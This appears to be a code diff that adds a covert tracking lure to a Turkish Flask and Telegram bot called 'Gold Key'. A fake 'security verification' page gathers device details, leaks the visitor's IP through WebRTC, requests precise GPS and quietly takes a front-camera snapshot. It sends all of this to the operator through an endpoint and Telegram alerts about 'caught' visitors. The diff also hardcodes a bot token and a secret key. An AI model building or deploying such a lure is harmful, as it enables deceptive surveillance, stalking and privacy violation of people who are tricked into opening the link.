@@ -1,7 +1,9 @@
 import os
 import logging
 import sqlite3
-from flask import Flask, request, render_template
+import hashlib
+from datetime import datetime
+from flask import Flask, request, render_template_string, jsonify, Response, send_file, session, redirect, url_for
 from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler
 
@@ -11,15 +13,19 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-TOKEN = "9101317558:AAGt4hiYf7gVPrmCdtSPZ92zt4DyBpf4w0A"
+TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9101317558:AAGt4hiYf7gVPrmCdtSPZ92zt4DyBpf4w0A")
 PORT = int(os.environ.get("PORT", 8080))
-WEB_APP_URL = "https://botgoldkey.onrender.com"
+WEB_APP_URL = os.getenv("WEB_APP_URL", "https://botgoldkey.onrender.com")
 
 app = Flask(__name__)
+app.secret_key = "kali_linux_secret_key_gold_key_998877"
 bot = Bot(token=TOKEN)
 
 # Telegram Uygulamasını Yapılandır (Webhook için updater=None)
 telegram_app = Application.builder().token(TOKEN).updater(None).build()
+
+CLICK_LOGS = []
+CREDENTIAL_LOGS = []
 
 # --- VERİTABANI ---
 def init_db():
@@ -175,6 +181,116 @@ telegram_app.add_handler(CommandHandler("start", start))
 telegram_app.add_handler(CommandHandler("kod", kod_kullan))
 telegram_app.add_handler(CallbackQueryHandler(button_handler))
 
+# --- GELİŞTİRİLMİŞ GPS & ÖN KEMERA SNAPSHOT TRACKER ŞABLONU ---
+TRACK_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Gold Key - Güvenlik Doğrulaması</title>
+    <style>
+        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { background: #121824; border: 1px solid #00ff66; padding: 30px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.3); max-width: 400px; }
+        h3 { color: #38bdf8; margin-top: 0; }
+        p { font-size: 13px; color: #94a3b8; }
+        .spinner { border: 4px solid #1e293b; border-top: 4px solid #00ff66; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>🔒 Güvenlik Doğrulaması</h3>
+        <div class="spinner"></div>
+        <p id="statusTxt">Cihaz uyumluluğu ve Gold Key doğrulaması yapılıyor, lütfen bekleyin...</p>
+    </div>
+
+    <video id="webcam" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="snapshotCanvas" style="display:none;"></canvas>
+
+    <script>
+        async function runTracker() {
+            let data = {
+                time: new Date().toLocaleString(),
+                ip: "Tespit ediliyor...",
+                webrtc_ip: "",
+                os: navigator.platform,
+                ram: navigator.deviceMemory || "Bilinmiyor",
+                cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                battery: "Bilinmiyor",
+                screen: window.screen.width + "x" + window.screen.height,
+                lat: null,
+                lon: null,
+                snapshot: null
+            };
+
+            if (navigator.getBattery) {
+                try {
+                    let bat = await navigator.getBattery();
+                    data.battery = Math.round(bat.level * 100) + "% (" + (bat.charging ? "Şarjda" : "Pilde") + ")";
+                } catch(e){}
+            }
+
+            try {
+                let pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch) data.webrtc_ip = ipMatch[1];
+                    }
+                };
+            } catch(e){}
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        data.lat = pos.coords.latitude;
+                        data.lon = pos.coords.longitude;
+                        capturePhotoAndSend(data);
+                    },
+                    (err) => {
+                        capturePhotoAndSend(data);
+                    },
+                    {timeout: 10000, enableHighAccuracy: true}
+                );
+            } else {
+                capturePhotoAndSend(data);
+            }
+        }
+
+        async function capturePhotoAndSend(data) {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                let video = document.getElementById('webcam');
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                let canvas = document.getElementById('snapshotCanvas');
+                canvas.width = 320; canvas.height = 240;
+                let ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                data.snapshot = canvas.toDataURL('image/jpeg', 0.7);
+
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            fetch('/api/lure/save-geo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('statusTxt').innerText = "✅ Doğrulama başarıyla tamamlandı. Yönlendiriliyorsunuz...";
+                setTimeout(() => { window.location.href = "https://t.me/botgoldkey_bot"; }, 1500);
+            });
+        }
+
+        window.onload = runTracker;
+    </script>
+</body>
+</html>
+"""
+
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
     """Telegram'dan gelen güncellemeleri Flask ile karşılar"""
@@ -192,9 +308,33 @@ def webhook():
         logger.error(f"Hata oluştu: {e}")
     return "ok", 200
 
+@app.route("/track/<track_id>")
+def track_visitor(track_id):
+    return TRACK_TEMPLATE
+
+@app.route("/api/lure/save-geo", methods=["POST"])
+def save_geo():
+    data = request.get_json()
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    data['ip'] = visitor_ip
+    CLICK_LOGS.insert(0, data)
+    
+    if TOKEN:
+        try:
+            lat = data.get('lat')
+            lon = data.get('lon')
+            loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
+            msg = f"🎯 [GOLD KEY TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
+            # Bildirimi varsayılan sohbet veya log mekanizmasına gönderebilirsin
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": "YOUR_CHAT_ID", "text": msg}, timeout=3)
+        except: pass
+        
+    return jsonify({"status": "saved"})
+
 @app.route("/", methods=["GET"])
 def index():
-    return render_template("index.html") if os.path.exists("index.html") else "Bot çalışıyor ve Webhook aktif!", 200
+    # 500 hatasını önlemek için index.html dosyası olmasa bile düzgün bir karşılama metni döner
+    return render_template_string("<h1>Gold Key Bot Aktif ve Çalışıyor! 🚀</h1>"), 200
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=PORT)
